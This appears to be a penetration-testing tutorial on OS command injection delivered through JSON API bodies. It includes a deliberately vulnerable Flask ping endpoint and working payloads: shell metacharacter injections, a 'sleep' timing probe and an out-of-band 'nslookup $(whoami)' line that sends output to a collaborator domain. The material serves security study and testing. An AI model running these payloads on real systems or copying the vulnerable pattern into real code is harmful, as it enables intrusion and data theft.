# OS Command Injection via API (Shell-Out Parameters in REST Bodies)

> Prerequisite: core OS command injection mechanics (shell metacharacters, blind
> techniques, out-of-band exfiltration) from the standalone Command Injection series.
> This file covers how those techniques are delivered and confirmed when the
> vulnerable parameter arrives via a JSON API body instead of a form field.

## 1. Why APIs Are a High-Value Target for Command Injection

Command injection requires the backend to pass user input into a shell-out function
(`system()`, `exec()`, `subprocess.run(shell=True)`, `child_process.exec()`, etc.).
This pattern shows up disproportionately often in API endpoints that wrap external
tooling, because "wrap a CLI tool as a microservice" is an extremely common backend
design pattern that has no form-based UI at all — the entire interface *is* the API.
Common real-world examples:

- File conversion APIs (`convert`, `ffmpeg`-backed image/video processing endpoints)
- Network diagnostic APIs (`ping`, `traceroute`, `nslookup` wrappers exposed as
  "connectivity check" features)
- PDF/report generation APIs shelling out to `wkhtmltopdf`, `pandoc`, or similar
- DevOps/internal tooling APIs wrapping `git`, `curl`, or deployment scripts

Because these endpoints exist specifically to interface with system-level tools, the
JSON body parameter is often only one abstraction layer away from a raw shell
command — sometimes literally string-concatenated into one.

## 2. The Vulnerable Pattern

```python
# Vulnerable Flask example
@app.route('/api/v1/network/ping', methods=['POST'])
def ping_host():
    data = request.get_json()
    host = data['host']
    result = os.system(f"ping -c 4 {host}")
    return jsonify({"output": result})
```

`host` is taken directly from the JSON body and concatenated into a shell command
string with no sanitization.

## 3. Basic Command Injection — Payload Breakdown

### 3.1 Baseline Request

```json
{
  "host": "8.8.8.8"
}
```

Normal behavior: server runs `ping -c 4 8.8.8.8` and returns the output.

### 3.2 Injected Request

```json
{
  "host": "8.8.8.8; whoami"
}
```

**Breakdown, piece by piece:**

| Fragment | Role |
|---|---|
| `8.8.8.8` | Intended value, keeps the original command syntactically valid so it still executes normally |
| `;` | Shell command separator — terminates the `ping` command and allows a second, independent command to follow, executed regardless of whether the first command succeeded |
| `whoami` | The injected command — prints the identity the web server process is running as, a classic low-risk confirmation payload before escalating |

Resulting shell execution: `ping -c 4 8.8.8.8; whoami` — both commands run
sequentially, and if the API reflects `stdout` back in the JSON response
(`{"output": "..."}`), the `whoami` output appears appended to the ping output,
confirming the injection immediately (this is the "in-band"/direct-output variant).

**Why this is JSON-safe with no escaping needed:** the payload uses `;` and letters
only — no `"`, no backslash, no raw newline — so it drops into the JSON string value
without invalidating the JSON document. This is why command injection payload
selection for API testing should prioritize metacharacters that don't collide with
JSON's own reserved characters first (`;`, `|`, `&&`, backticks in non-JSON-quote
contexts), saving JSON-escaped variants for when the target shell/OS forces a
different metacharacter that does need escaping.

## 4. Other Shell Metacharacter Variants

| Payload value | Metacharacter | Behavior |
|---|---|---|
| `8.8.8.8 \| whoami` | `\|` (pipe) | Pipes the output of the first command into `whoami` as input — `whoami` still runs and its own output is what typically gets returned (some shells override the piped stdin, so behavior varies; confirm empirically) |
| `8.8.8.8 && whoami` | `&&` (AND) | Runs `whoami` only if `ping` succeeds (exit code 0) — useful when you want to confirm a specific execution path completed first |
| `8.8.8.8 \|\| whoami` | `\|\|` (OR) | Runs `whoami` only if `ping` fails — useful for testing when you expect the first command to error out (e.g., invalid host format) |
| `` 8.8.8.8`whoami` `` | backtick command substitution | Executes `whoami` as a subshell and substitutes its output *inline* into the `ping` command's argument list — this variant requires JSON escaping consideration only if your payload also needs a literal backslash elsewhere, backticks themselves are JSON-safe |
| `8.8.8.8$(whoami)` | `$()` command substitution | Same effect as backticks, modern POSIX shell syntax, also JSON-safe as-is |

## 5. Blind Command Injection via API (No Reflected Output)

Most real-world APIs do **not** echo command output back in the response (unlike the
naive example above). This is the more common real-world case and requires blind
confirmation techniques — directly analogous to blind SQLi, but using OS-level
side effects as the oracle.

### 5.1 Time-Based Blind Confirmation

```json
{
  "host": "8.8.8.8; sleep 10"
}
```

**Breakdown:**

| Fragment | Role |
|---|---|
| `8.8.8.8;` | Preserves valid execution of the first command, then separates |
| `sleep 10` | Injected command with no useful output — its only purpose is to force a 10-second delay, which is measurable purely from HTTP response timing regardless of what the JSON response body contains |

If the API's response time increases by ~10 seconds relative to baseline, command
injection is confirmed even with a completely generic/unchanged JSON response body.

### 5.2 Out-of-Band (OOB) Confirmation

When even timing is unreliable (e.g., the API processes requests asynchronously via
a job queue, decoupling HTTP response time from actual command execution time),
use DNS or HTTP out-of-band callbacks:

```json
{
  "host": "8.8.8.8; nslookup $(whoami).oob.burpcollaborator.net"
}
```

**Breakdown:**

| Fragment | Role |
|---|---|
| `8.8.8.8;` | Separator, as before |
| `nslookup` | Forces a DNS lookup, which is the delivery mechanism for the exfiltrated data — DNS requests routinely escape network egress restrictions that would block direct HTTP callbacks, making this a good default choice against locked-down backend/internal API infrastructure |
| `$(whoami)` | Command substitution executed *before* the DNS lookup is made — its output becomes part of the hostname being resolved |
| `.oob.burpcollaborator.net` | Attacker-controlled collaborator domain (Burp Collaborator or equivalent, e.g., interactsh) — the resulting DNS query received by the collaborator server contains the `whoami` output as a subdomain label, exfiltrating it without needing any direct response from the target API at all |

This technique is essential for API testing specifically because asynchronous
job-queue architectures (a very common API backend pattern — accept request, return
`202 Accepted` immediately, process later) make both in-band and time-based
confirmation unreliable; OOB confirmation is decoupled from the HTTP
request/response cycle entirely and will fire whenever the backend eventually
executes the injected command, minutes or even hours later.

## 6. Nested/Nested-Field Delivery

Consistent with the series theme, command injection points in real APIs are
frequently buried in nested JSON:

```json
{
  "job": {
    "type": "network_diagnostic",
    "target": {
      "host": "8.8.8.8; sleep 10",
      "protocol": "icmp"
    }
  }
}
```

Walk every string-typed leaf value in the JSON tree when testing for injection —
`job.target.host` here is just as exploitable as a top-level `host` key would be, but
easy to miss if you only fuzz top-level parameters.

## 7. Burp Suite Workflow for API-Context Command Injection

1. Identify JSON body fields that semantically suggest system interaction —
   hostnames, filenames, file paths, URLs, format/conversion options — these are the
   highest-probability shell-out parameters.
2. Send baseline request, record response time and body.
3. In Repeater, test metacharacter variants from Section 4 one at a time, watching
   for reflected output first (fastest confirmation if present).
4. If no reflected output, switch to time-based payloads (Section 5.1) and compare
   against a 3–5 request baseline average (network jitter can create false positives
   on a single measurement).
5. If timing is inconclusive or the endpoint is asynchronous (returns `202` or a job
   ID immediately), set up a Burp Collaborator client and use OOB payloads
   (Section 5.2), then poll the Collaborator tab for interactions.
6. Once confirmed, escalate from proof-of-concept commands (`whoami`, `id`,
   `sleep`) to controlled, scope-appropriate commands only, per program/engagement
   rules of engagement — do not run destructive or broad reconnaissance commands
   during initial confirmation.

## 8. PortSwigger Lab Mapping

Complete in this order:

1. **OS command injection, simple case** — establishes core metacharacter mechanics
   (in-band output); adapt the payload into a JSON body per Section 3 when practicing
   against a real API target.
2. **Blind OS command injection with time delays** — maps directly onto Section 5.1.
3. **Blind OS command injection with output redirection** — teaches writing command
   output to a web-accessible file as an alternative exfiltration channel; relevant
   for API targets where you have separately identified a static-file-serving path
   the API's execution environment can write to.
4. **Blind OS command injection with out-of-band interaction** — maps directly onto
   Section 5.2's Collaborator-based technique.
5. **Blind OS command injection with out-of-band data exfiltration** — extends the
   above to exfiltrate actual command output (not just confirm execution), the
   closest lab analog to a real high-severity API command injection finding.

**Gap disclosure:** all of these labs deliver the vulnerable parameter via a
traditional form/query-string field, not a JSON body — same gap noted in file 02.
The JSON-context adaptation (payload placement inside a JSON string value, and the
escaping considerations from file 01 Section 1.5) is not tested by any current
PortSwigger lab and must be practiced against real JSON API targets separately
(crAPI, DVWA's API mode if available in your deployment, or in-scope bug bounty
targets).

## 9. Real-World Notes

- File-processing and format-conversion API endpoints are consistently the highest
  hit-rate targets for this vulnerability class in bug bounty programs — any
  endpoint accepting a URL, filename, or format string that gets passed to
  `ffmpeg`, `imagemagick`, `pandoc`, `wkhtmltopdf`, or similar CLI-wrapping libraries
  deserves dedicated attention.
- Node.js's `child_process.exec()` (shell-interpreting) versus
  `child_process.execFile()`/`spawn()` (non-shell-interpreting, array-based
  arguments) is the single most common root-cause distinction — `exec()` usage on
  any user-influenced parameter is close to an automatic finding, while
  `execFile()`/`spawn()` usage is generally safe from shell metacharacter injection
  even with the same user input, though argument injection (a related but distinct
  issue) can still apply if arguments are attacker-controlled.
- Async/job-queue-based APIs (Section 5.2 context) are increasingly common in
  API-first architectures (webhooks, background processing, "long-running task"
  patterns) — always check whether an endpoint returns a job ID or `202 Accepted`
  before assuming in-band/time-based techniques are your only option; default to OOB
  testing early against this endpoint shape rather than as a last resort.
